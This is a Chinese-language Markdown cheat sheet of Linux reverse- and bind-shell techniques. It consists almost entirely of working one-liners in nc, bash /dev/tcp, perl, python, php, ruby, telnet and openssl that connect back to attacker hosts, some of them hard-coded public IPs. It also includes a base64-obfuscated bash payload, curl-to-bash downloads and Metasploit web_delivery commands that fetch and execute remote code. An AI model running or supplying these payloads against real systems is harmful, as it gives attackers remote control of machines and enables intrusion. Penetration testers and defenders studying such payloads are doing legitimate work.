# Linux Shell 反弹

*反弹shell之前必须获取命令执行权限*

## NC

- nc 正向shell

    被控端开启监听

    ```sh
    nc -lvvp port -e /bin/sh
    ```

    控制端发起连接：

    ```sh
    nc <target ip> port
    # 这里的port就是被控端监听的端口
    ```

- nc 反向 shell

    控制端开启监听：

    ```sh
    nc -lvvp port
    ```

    被控端发起连接：

    ```sh
    nc -e /bin/sh <attacker ip> port
    # port = attacker listening port
    ```

- 无 -e 参数反弹shell

    控制端开启监听：

    ```sh
    nc -lvvp port
    ```

    被控端发起连接

    ```sh
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc attacker-ip port >/tmp/f
    ```

    或

    ```sh
    mknod backpipe p; nc attacker-ip port 0<backpipe | /bin/bash 1>backpipe 2>backpipe
    ```

    msf 生成payload

    ```sh
    msfvenom -l payload | grep "netcat" | awk '{print $1}'
    ```

## bash

控制端开启监听：

```bash
nc -lvvp port
```

被控端发起连接

```bash
bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
```

或

```bash
exec 5<>/dev/tcp/139.155.49.43/6666;cat <&5 | while read line; do $line 2>&5 >&5; done
# base64编码绕过：
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64 -d|bash -i"
```

msf 生成payload

```bash
msfvenom -l payload | grep "bash" | awk '{print $1}'
```

## perl

控制端开启监听：

```bash
nc -lvvp port
```

被控端发起连接：

```bash
perl -e 'use Socket;$i="47.101.214.85";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

或

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"47.101.214.85:6666");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

msf 生成 payload

```bash
msfvenom -l payload | grep "perl" | awk '{print $1}'
```

## curl

攻击者：

```sh
vim index.html
# 编辑以下内容
bash -i >& /dev/tcp/139.155.49.43/6666 0>&1
# 开启监听
python -m http.server
```

控制端打开新的终端

```sh
nc -lvvp 6666
```

被控端：

```sh
curl 139.155.49.43:8000|bash
# 或
curl http://139.155.49.43:8000/index.html|bash
```

## python

控制端开启监听：

```sh
nc -lvvp 6666
```

被控端：

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.101.214.85",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# 修改代码中的ip和端口
```

- 通过 msfvenom 生成 python 反弹 shell 的 payload

    ```sh
    # 生成payload
    msfvenom -p python/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=6666 -f raw

    # 进入msf终端后运行
    handler -p python/meterpreter/reverse_tcp -H 139.155.49.43 -P 6666
    ```

    web delivery 反弹 shell

    ```sh
    use exploit/multi/script/web_delivery
    msf5 exploit(multi/script/web_delivery) > set target 0
    msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
    msf5 exploit(multi/script/web_delivery) > set lport 8888
    msf5 exploit(multi/script/web_delivery) > exploit –j

    # 被控端运行以下代码
    python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://139.155.49.43:8080/pWMAajktf', context=ssl._create_unverified_context());exec(r.read());"
    ```

- msf 生成 payload

    ```sh
    msfvenom -l payload | grep "python" | awk '{print $1}'
    ```

## php

- php命令反弹shell

    被控端：

    ```sh
    php -r '$sock=fsockopen("47.101.214.85",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```

    控制端：

    ```sh
    nc -lvvp 6666
    ```

- msfvenom 生成反弹shell脚本

    控制端：

    ```sh
    # 生成 payload
    msfvenom -p php/bind_php lport=6666 -f raw > bind_php.php

    # 开启监听
    python -m http.server
    ```

    被控端：

    ```sh
    wget attacker-ip:port/bind_php.php
    # 这里的port是控制端python http.server监听的端口
    # 这一步操作就是将木马文件下载的被控主机的web目录下
    ```

    控制端执行：

    ```sh
    # 在root用户下进去msfconsole
    msfconsole
    # 在msfconsole下设置相应参数
    use exploit/multi/handler
    set payload /php/bind_php
    set lport 8888
    set rhost 被控端ip
    run
    ```

- web delivery 反弹shell

    ```sh
    use exploit/multi/script/web_delivery
    set target 1
    set payload php/meterpreter/reverse_tcp
    exploit –j

    # 被控端执行
    php -d allow_url_fopen=true -r "eval(file_get_contents('http://139.155.49.43:8080/RRfKpX', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
    ```

- msf 生成 payload

    ```sh
    msfvenom -l payload | grep "php" | awk '{print $1}'
    ```

## Ruby

控制端生成payload

```sh
msfvenom -p cmd/unix/bind_ruby lport=8080 -f raw
```

被控端运行payload

```sh
ruby -rsocket -e 'exit if fork;s=TCPServer.new("8888");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end;end'
```

控制端

```sh
# 进入msf终端
msfconsole

use exploit/multi/web_delivery
handler -p cmd/unix/bind_ruby -H 被控端ip -P 8080
```

- msf 生成 payload

    ```sh
    msfvenom -l payload | grep "ruby" | awk '{print $1}'
    ```

## Telnet

- 方法一

    *攻击端监听两个端口，第一个用于输入命令，第二个返回结果*

    攻击机：
    ```sh
    nc -lvvp 5555
    nc -lvvp 6666
    ```

    目标机： 

    ```sh
    telnet 47.101.214.85 5555 | /bin/bash | telnet 47.101.214.85 6666
    ```

- 方法二

    控制端

    ```sh
    nc -lvvp 8888
    ```

    被控端

    ```sh
    rm -f a && mknod a p && telnet 47.101.214.85 6666 0<a | /bin/bash 1>a
    rm -f a;mknod a p;telnet 47.101.214.85 6666 0<a | /bin/bash 1>a
    ```

## openssl

>openssl 反弹443端口，流量解密传输

控制端生成密钥文件

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

控制端开启监听

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

被控端反弹shell

```sh
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```

## 关于web_delivery的注意点

***成功反弹shell后，控制端会有返回连接会话id，使用`sessions`命令也可以查看当前建立的连接，`sessions id`进入指定的会话，然后输入`shell`进入交互界面***